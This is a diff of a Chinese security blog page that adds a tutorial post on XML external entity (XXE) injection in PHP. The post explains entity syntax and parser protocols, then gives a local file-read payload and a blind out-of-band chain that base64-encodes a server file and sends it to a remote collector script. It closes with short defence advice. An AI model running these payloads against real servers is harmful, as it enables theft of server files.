@@ -6,14 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: plan | WebDogC</title>
+  <title>XML注入(XXE) | WebDogC</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="WebDogC">
-<meta property="og:url" content="http://yoursite.com/tags/plan/index.html">
+  <meta name="description" content="XML定义：EXtensible Markup Language(XML)，可扩展标记语言，用于存储数据。 XML文档组成&amp;emsp;&amp;emsp;1.XML声明 文档相关信息&amp;emsp;&amp;emsp;2.DTD部分 定义XML变量&amp;emsp;&amp;emsp;3.XML部分 具体数据&amp;emsp;&amp;emsp;&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;&amp;em">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML注入(XXE)">
+<meta property="og:url" content="http://yoursite.com/2020/04/06/XML%E6%B3%A8%E5%85%A5(XXE)/index.html">
 <meta property="og:site_name" content="WebDogC">
+<meta property="og:description" content="XML定义：EXtensible Markup Language(XML)，可扩展标记语言，用于存储数据。 XML文档组成&amp;emsp;&amp;emsp;1.XML声明 文档相关信息&amp;emsp;&amp;emsp;2.DTD部分 定义XML变量&amp;emsp;&amp;emsp;3.XML部分 具体数据&amp;emsp;&amp;emsp;&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;&amp;em">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-06T08:30:03.236Z">
+<meta property="article:modified_time" content="2020-04-06T09:47:52.500Z">
 <meta property="article:author" content="WebDogC">
+<meta property="article:tag" content="XXE、security、Web安全、note">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="WebDogC" type="application/atom+xml">
@@ -158,60 +163,196 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-XML注入(XXE)" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/28/Web%E6%B8%97%E9%80%8F%E5%B7%A5%E7%A8%8B%E5%B8%88%E4%B9%8B%E8%B7%AF/" class="archive-article-date">
-  	<time datetime="2020-02-28T11:50:45.925Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-28</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/28/Web%E6%B8%97%E9%80%8F%E5%B7%A5%E7%A8%8B%E5%B8%88%E4%B9%8B%E8%B7%AF/">Web渗透工程师之路</a>
+    <h1 class="article-title" itemprop="name">
+      XML注入(XXE)
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2020/04/06/XML%E6%B3%A8%E5%85%A5(XXE)/" class="archive-article-date">
+  	<time datetime="2020-04-06T08:30:03.236Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>定义</strong>：EXtensible Markup Language(XML)，可扩展标记语言，用于存储数据。</p>
+<p><strong>XML文档组成</strong><br>&emsp;&emsp;1.XML声明 文档相关信息<br>&emsp;&emsp;2.DTD部分 定义XML变量<br>&emsp;&emsp;3.XML部分 具体数据<br>&emsp;&emsp;<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code><br>&emsp;&emsp;在XML实体中，可以使用协议进行外部引用，关键字<code>SYSTEM</code>会令XML解析器从URI/URL中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过发送构造实体给应用程序，然后让应用程序去呈现实体中的代码来实现攻击。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容(可能是系统上本地文件亦或是远程系统上的文件)，以达获取敏感信息、内网渗透等恶意目的。</p>
+<h4 id="SYSTEM支持的协议"><a href="#SYSTEM支持的协议" class="headerlink" title="SYSTEM支持的协议"></a>SYSTEM支持的协议</h4><ul>
+<li>libxml2：file、http、ftp</li>
+<li>PHP：file、http、ftp、php、data、glob、phar、compress.zlib、compress.bzip2</li>
+<li>Java：http、https、ftp、file、jar、netdoc、mailto、gopher</li>
+<li>.NET：file、http、https、ftp</li>
+</ul>
+<p>———-分割线————-</p>
+<h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><p><strong>简述</strong><br>&emsp;&emsp;XXE注入即XML External Entity 外部实体注入，实质是XML注入。<br>&emsp;&emsp;通常在PHP中，使用<code>simplexml_load_string</code>函数的地方会造成XXE注入漏洞。<br>&emsp;&emsp;在php中，存在函数<code>simplexml_load_string</code>，其作用是转换形式良好的 <code>XML</code> 字符串为 <code>SimpleXMLElement</code> 对象。如果成功则返回 <code>SimpleXMLElement</code> 对象，如果失败则返回 FALSE。</p>
+<p><strong>用法：</strong><br>&emsp;&emsp;simplexml_load_string($str, ‘SimpleXMLElement’, LIBXML_NOENT),将xml形式的字符串str，转换成<code>SimpleXMLElement</code> 对象。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php	</span><br><span class="line">	$test &#x3D; &#39;&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;1.txt&quot;&gt;]&gt;&lt;scan&gt;&amp;test;&lt;&#x2F;scan&gt;&#39;;</span><br><span class="line">	$obj &#x3D; simplexml_load_string($test, &#39;SimpleXMLElement&#39;, LIBXML_NOENT);</span><br><span class="line">	print_r($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>分析：</strong><br>&emsp;&emsp;变量<code>$test</code>是一个内容为XML代码(使用file协议读取文件<code>c:/1.txt</code>)的字符串，使用<code>simplexml_load_string</code>将字符串转化为<code>SimpleXMLElement</code>对象，并复制给<code>$obj</code>，然后打印<code>$obj</code>，输出内容为<code>c:1.txt</code>文件内容。<br>&emsp;&emsp;在多数情况下，后端语言解析了XML后并不会直接输出，这时需要用到一个类似XSS平台一样的接收平台，XML读取数据然后发送到接收平台，要查看的数据就会被保存在平台内，这过程又类似反弹注入。</p>
+<p><strong>漏洞原理：</strong><br>&emsp;&emsp;与注入攻击一致，程序在解析输入的XML数据时，解析了攻击者使用伪造的外部实体而产生的漏洞。</p>
+<h4 id="XXE注入攻击过程"><a href="#XXE注入攻击过程" class="headerlink" title="XXE注入攻击过程"></a>XXE注入攻击过程</h4><p>&emsp;&emsp;将xml文档内容作为一个字符串赋值给一个变量<code>$test</code>，xml文档代码包括访问我们所需要的数据文件的执行代码，接着由<code>simplexml_load_string</code>将<code>$test</code>转化为可输出的<code>SimpleXMLElement</code>对象，输出此对象，服务器会去执行xml文档中的代码即访问指定文件并将此输出，由于多数情况下网页不会直接输出数据结果，所以在<code>$test</code>的xml代码中加上访问一个公网上的中介xml文档的代码，而这个中介xml文档的作用是将接收读取的数据文件并写入到可见文件中，这就实现了读取服务器上的文件内容。</p>
+<p><strong>举例</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">注入payload</span><br><span class="line">&lt;?php</span><br><span class="line">	$test &#x3D;&lt;&lt;&lt;EOF</span><br><span class="line">	&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">	&lt;!DOCTYPE ANY[</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;c:&#x2F;1.txt&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;···&#x2F;xxe&#x2F;1.xml&quot;&gt; </span><br><span class="line">	%remote;</span><br><span class="line">	]&gt;</span><br><span class="line">	EOF;</span><br><span class="line">	$obj &#x3D; simplexml_load_string($test, &#39;SimpleXMLElement&#39;, LIBXML_NOENT);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.xml</span><br><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;·····&#x2F;xxe&#x2F;2.php?id&#x3D;%file;&#39;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2.php</span><br><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&quot;id&quot;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>分析</strong><br>&emsp;&emsp;变量$test是一个以xml代码文档为内容的字符串，<code>&lt;&lt;&lt;EOF···EOF</code>表示在EOF之间的内容全是字符串。在xml文档中，声明了变量<code>%file</code>，其作用是读取C盘下经过base64加密(便于处理特殊字符)后的<code>1.txt</code>文件内容，还有变量<code>$remote</code>，其作用是访问一个指定域名下的<code>1.xml</code>文件。<code>1.xml</code>文件代码的作用是将<code>%file</code>变量(即读取到的文件内容)以传参的方式传给指定域名的<code>2.php</code>文件中，接下来只要在<code>2.php</code>文件中接收参数并对其进行处理即可获得<code>1.txt</code>文件数据(例如将文件内容写到<code>3.txt</code>文件中)。</p>
+<h4 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h4><ol>
+<li>使用开发语言提供的禁用外部实体的方法。</li>
+<li>对用户提交的XML数据进行严格检查及关键词(SYSTEM等)过滤。</li>
+</ol>
+<p><br /><br /><br /><br /></p>
+<blockquote>
+<p>学无止境</p>
+</blockquote>
+<p>作者：WebDogC</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">plan</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XXE、security、Web安全、note</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/06/XML%E6%B3%A8%E5%85%A5(XXE)/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2020/04/06/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">变量覆盖漏洞</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -234,9 +375,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
